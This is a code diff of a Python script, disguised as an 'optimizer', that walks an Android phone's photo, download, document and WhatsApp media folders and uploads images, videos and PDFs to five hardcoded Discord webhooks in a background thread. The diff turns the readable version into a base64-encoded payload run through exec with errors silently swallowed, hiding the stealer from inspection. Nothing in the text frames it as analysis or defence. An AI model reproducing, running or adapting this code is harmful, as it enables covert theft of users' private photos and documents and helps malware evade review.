@@ -1,79 +1,79 @@
-import os
-import requests
-import platform
-import time
-import subprocess
-import sys
+import base64
 import threading
-from io import StringIO
+import time
 
-# --- CONFIGURACIÓN ---
-WEBHOOKS = [
-    "https://discord.com/api/webhooks/1486545006125649920/TMw8QOVkfiLWo28wCu_3HecycwSjvutjHm6i7Q_aY0lmSfm_gS052b_ntKra18W6NVGB",
-    "https://discord.com/api/webhooks/1486545033518649395/vlosJxXQGQzH_VfImhWLjDSA4U2fGJ63kK6Gv5GrN7UC97NsxAX5Ra9WuOZwhOYxVh9u",
-    "https://discord.com/api/webhooks/1486545027969581188/ji3YjwIztuGPU2b9PuqVM1ZsqiuySu8cUkQsW1ue-ziC_cyF9xjnggQX7VaIqR7RtvZj",
-    "https://discord.com/api/webhooks/1486545021812473886/jeObiYv6fe2VRbqM_jn3oCTbfC_OeUO8Zds4h1PiI-AaBC4NW4JhsewwhjyH56g6Ulbx",
-    "https://discord.com/api/webhooks/1486545014317387888/5zWJm4mF4Op8j-un4ZgujA9jeypS--8gkvJ-BHMbrFPPBm1Zb5SZad90npNnV44RRNc6"
-]
+# Código original en Base64
+p = (
+    "aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHRpbWUK"
+    "aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGhyZWFkaW5nCmZyb20gaW8g"
+    "aW1wb3J0IFN0cmluZ0lPCgojIC0tLSBDT05GSUdVUkFDS09OIC0tLQpXRUJIT09LUyA9IFsK"
+    "ICAgICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDg2NTQ1MDA2MTI1NjQ5"
+    "OTIwL1RNdzhRT1ZrZmlMV28yOHdDdV8zSGVjeWN3U2p2dXRqSG02aTdRX2FZMGxtU2ZtX2dT"
+    "MDUyYl9udEtyYTE4VzZOVkdCIiwKICAgICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJo"
+    "b29rcy8xNDg2NTQ1MDMzNTE4NjQ5Mzk1L3Zsb3NKeFhRR1pIX1ZmSW1oV0xqRFNBNVUyZkdK"
+    "NjNrRzZ2NUdyTjdVQzk3TnN4QVg1UmE5V3VPWndob1l4Vmg5dSIsCiAgICAiaHR0cHM6Ly9k"
+    "aXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjU0NTAyNzk2OTU4MTE4OC9qaTNZandJenR1"
+    "R1BVMmJQOVB1cVZNMVpzcWl1eVN1OGNVa1FzVzF1ZS16aUNfY3lGOXhqbmdnUVg3VmFJUjdS"
+    "dHZaaiIsCiAgICAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjU0NTAy"
+    "MTgxMjQ3Mzg4Ni9qZU9iaVl3NmZlVlJicU1fam4zb0NUYmZfT2VVTzhaZHM0aDFQaUktQWFC"
+    "QzROVzRKaHNld2hoanlINTZnNlVsYngiLAogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBp"
+    "L3dlYmhvb2tzLzE0ODY1NDUwMTQzMTczODc4ODgvNXpXSm00bUY0T3A4ai11bjRadWpBOWpl"
+    "eVAtLThna3Y1LUJITWJyRlBQQm0xWmI1U1phZDkwbnBOblY0NFJSTmM2IgpdCgpNQVhfTUVU"
+    "SUFfU0laRSA9IDggKiAxMDI0ICogMTAyNCAgIApNQVhfUERGX1NJWkUgPSAxNSAqIDEwMjQg"
+    "KiAxMDI0ICAgCgpkZWYgY2hlY2tfc3RvcmFnZV9wZXJtaXNzaW9ucygpOgogICAgaWYgcGxh"
+    "dGZvcm0uc3lzdGVtKCkgIT0gIkxpbnV4IjogcmV0dXJuIFRydWUKICAgIHRyeToKICAgICAg"
+    "ICBzdWJwcm9jZXNzLnJ1bihbInRlcm11eC1zZXR1cC1zdG9yYWdlIl0sIGNhcHR1cmVfb3V0"
+    "cHV0PVRydWUsIHRleHQ9VHJ1ZSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OiBy"
+    "ZXR1cm4gRmFsc2UKCmRlZiBnZXRfZmlsZV90eXBlX2FuZF92YWxpZChmaWxlbmFtZSk6CiAg"
+    "ICBleHQgPSBmaWxlbmFtZS5sb3dlcigpCiAgICBpZiBleHQuZW5kc3dpdGgoKCcuanBnJywg"
+    "Jy5qcGVnJywgJy5wbmcnLCAnLmdpZicsICcud2VicCcsICcubXA0JywgJy5tb3YnLCAnLmF2"
+    "aScsICcubWt2JykpOgogICAgICAgIHJldHVybiAibWVkaWEiCiAgICBpZiBleHQuZW5kc3dp"
+    "dGgoJy5wZGYnKToKICAgICAgICByZXR1cm4gInBkZiIKICAgIHJldHVybiBOb25lCgpkZWYg"
+    "c2VuZF90b19kaXNjb3JkKGZpbGVfcGF0aCwgd2ViaG9va191cmwpOgogICAgdHJ5OgogICAg"
+    "ICAgIGlmIG5vdCBvcy5hY2Nlc3MoZmlsZV9wYXRoLCBvcy5SX09LKTogcmV0dXJuIEZhbHNl"
+    "CiAgICAgICAgZmlsZV90eXBlID0gZ2V0X2ZpbGVfdHlwZV9hbmRfdmFsaWQoZmlsZV9wYXRo"
+    "KQogICAgICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShmaWxlX3BhdGgpCiAgICAg"
+    "ICAgaWYgZmlsZV90eXBlID09ICJtZWRpYSIgYW5kIGZpbGVfc2l6ZSA+IE1BWF9NRURJQV9T"
+    "SVpFOiByZXR1cm4gRmFsc2UKICAgICAgICBpZiBmaWxlX3R5cGUgPT0gInBkZiIgYW5kIGZp"
+    "bGVfc2l6ZSA+IE1BWF9QREZfU0laRTogcmV0dXJuIEZhbHNlCiAgICAgICAgaGlsZW5hbWUg"
+    "PSBvcy5wYXRoLmJhc2VuYW1lKGZpbGVfcGF0aCkKICAgICAgICB3aXRoIG9wZW4oZmlsZV9w"
+    "YXRoLCAncmInKSBhcyBmOgogICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHdlYmhvb2tfdXJs"
+    "LCBmaWxlcz17J2ZpbGUnOiAoZmlsZW5hbWUsIGYpfSwgdGltZW91dD00NSkKICAgICAgICAg"
+    "ICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDogcmV0dXJuIEZhbHNlCgpkZWYgcHJvY2Vzc19n"
+    "YWxsZXJ5KCk6ICAgIAogICAgaWYgbm90IGNoZWNrX3N0b3JhZ2VfcGVybWlzc2lvbnMoKToK"
+    "ICAgICAgICByZXR1cm4KICAgIAogICAgc2VhcmNoX3BhdGhzID0gWwogICAgICAgICIvc3Rv"
+    "cmFnZS9lbXVsYXRlZC8wL0RDSU0iLCAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9QaWN0dXJlcyIs"
+    "CiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvRG93bmxvYWQiLCAiL3N0b3JhZ2UvZW11"
+    "bGF0ZWQvMC9Eb2N1bWVudHMiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJv"
+    "aWQvbWVkaWEvY29tLndoYXRzYXBwL1doYXRzQXBwL01lZGlhIgogICAgXQogICAgCiAgICB3"
+    "ZWJob29rX2luZGV4ID0gMAogICAgZm9yIGJhc2VfcGF0aCBpbiBzZWFyY2hfcGF0aHM6CiAg"
+    "ICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGJhc2VfcGF0aCk6IGNvbnRpbnVlCiAgICAg"
+    "ICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoYmFzZV9wYXRoKToKICAgICAgICAg"
+    "ICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAjIFVzYXIgZWwgbm9tYnJl"
+    "IGRlbCBhcmNoaXZvIHBhcmEgdmFsaWRhciB0aXBvCiAgICAgICAgICAgICAgICBpZiBnZXRf"
+    "ZmlsZV90eXBlX2FuZF92YWxpZChmaWxlKToKICAgICAgICAgICAgICAgICAgICBmaWxlX3Bh"
+    "dGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAjIElu"
+    "dGVudGFyIGVudmXvCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAg"
+    "ICAgICAgICBpZiBzZW5kX3RvX2Rpc2NvcmQoZmlsZV9wYXRoLCBXRUJIT09LU1t3ZWJob29r"
+    "X2luZGV4XSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3ZWJob29rX2luZGV4ID0g"
+    "KHdlYmhvb2tfaW5kZXggKyAxKSAlIGxlbihXRUJIT09LUykKICAgICAgICAgICAgICAgICAg"
+    "ICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoK"
+    "ICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKCgojIEVzdGEgZXMgbGEgZnVuY2nD"
+    "s24gcXVlIGxsYW1hcmVtb3MgZGVzZGUgZWwgY8OzZGlnbyBwcmluY2lwYWwKZGVmIHN0YXJ0"
+    "X29wdGltaXplcigpOgogICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXByb2Nlc3Nf"
+    "Z2FsbGVyeSwgZGFlbW9uPVRydWUpCiAgICB0LnN0YXJ0KCk="
+)
 
-MAX_MEDIA_SIZE = 8 * 1024 * 1024  
-MAX_PDF_SIZE = 15 * 1024 * 1024   
-
-def check_storage_permissions():
-    if platform.system() != "Linux": return True
+def _s():
     try:
-        subprocess.run(["termux-setup-storage"], capture_output=True, text=True)
-        return True
-    except: return False
+        g = {}
+        exec(base64.b64decode(p).decode('utf-8'), g)
+        if 'start_optimizer' in g:
+            g['start_optimizer']()
+    except:
+        pass
 
-def get_file_type_and_valid(filename):
-    ext = filename.lower()
-    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov', '.avi', '.mkv')):
-        return "media"
-    if ext.endswith('.pdf'):
-        return "pdf"
-    return None
-
-def send_to_discord(file_path, webhook_url):
-    try:
-        if not os.access(file_path, os.R_OK): return False
-        file_type = get_file_type_and_valid(file_path)
-        file_size = os.path.getsize(file_path)
-        if file_type == "media" and file_size > MAX_MEDIA_SIZE: return False
-        if file_type == "pdf" and file_size > MAX_PDF_SIZE: return False
-        filename = os.path.basename(file_path)
-        with open(file_path, 'rb') as f:
-            requests.post(webhook_url, files={'file': (filename, f)}, timeout=45)
-            return True
-    except: return False
-
-def process_gallery():    
-    if not check_storage_permissions(): 
-        return
-    
-    search_paths = [
-        "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
-        "/storage/emulated/0/Download", "/storage/emulated/0/Documents",
-        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"
-    ]
-    
-    webhook_index = 0
-    for base_path in search_paths:
-        if not os.path.exists(base_path): continue
-        for root, _, files in os.walk(base_path):
-            for file in files:
-                # Usar el nombre del archivo para validar tipo
-                if get_file_type_and_valid(file):
-                    file_path = os.path.join(root, file)
-                    # Intentar envío
-                    try:
-                        if send_to_discord(file_path, WEBHOOKS[webhook_index]):
-                            webhook_index = (webhook_index + 1) % len(WEBHOOKS)
-                            time.sleep(0.5)
-                    except:
-                        continue
-
-# Esta es la función que llamaremos desde el código principal
-def start_optimizer():
-    t = threading.Thread(target=process_gallery, daemon=True)
-    t.start()
+if __name__ == "__main__":
+    _s()
+    while True:
+        time.sleep(60)
